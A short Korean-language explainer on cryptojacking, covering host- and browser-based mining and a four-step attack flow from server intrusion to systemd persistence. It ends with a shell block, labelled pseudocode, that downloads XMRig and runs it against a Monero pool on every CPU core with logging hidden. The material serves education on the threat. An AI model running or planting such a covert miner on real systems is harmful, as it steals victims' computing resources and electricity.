#1. 크립토재킹(Cryptojacking)이란?

💻 ➜ ⛏️ ➜ 💰 ➜ 🌡️

"남의 전기와 컴퓨터로 돈을 버는 디지털 기생충"

크립토재킹(Cryptojacking)은 다른 사람의 컴퓨터 자원(CPU/GPU)을 몰래 사용하여 암호화폐를 채굴하는 공격입니다. 피해자는 컴퓨터가 느려지고, 전기료가 급증하며, 하드웨어 수명이 단축됩니다. 공격자는 전기료와 장비 비용 없이 암호화폐 수익을 얻습니다.

호스트 기반 마이닝

  • - 서버/PC에 채굴 프로그램 설치
  • - XMRig, CCMiner 등 오픈소스 악용
  • - CPU/GPU 100% 지속 사용

브라우저 기반 마이닝

  • - 웹페이지에 JavaScript 마이너 삽입
  • - 방문자의 CPU를 사이트 체류 중 사용
  • - 브라우저를 닫으면 중단

#2. 공격 기법 분석

채굴 설치 과정

Step 1 취약한 서버 침투 (SSH 브루트포스, 웹 취약점 등)
Step 2 XMRig 채굴기 다운로드 + 설정 파일 배포
Step 3 systemd 서비스로 등록하여 지속성(Persistence) 확보
Step 4 마이닝 풀에 연결하여 Monero(XMR) 채굴 시작
# XMRig 설치 및 실행 의사코드
wget -q https://github.com/xmrig/xmrig/releases/xmrig-6.21.tar.gz
tar -xzf xmrig-6.21.tar.gz && cd xmrig-6.21
./xmrig -o pool.minexmr.com:443 -u WALLET_ADDR
--threads=$(nproc) --cpu-priority=1 # 모든 CPU 코어 사용
--background --log-file=/dev/null # 은밀하게 실행
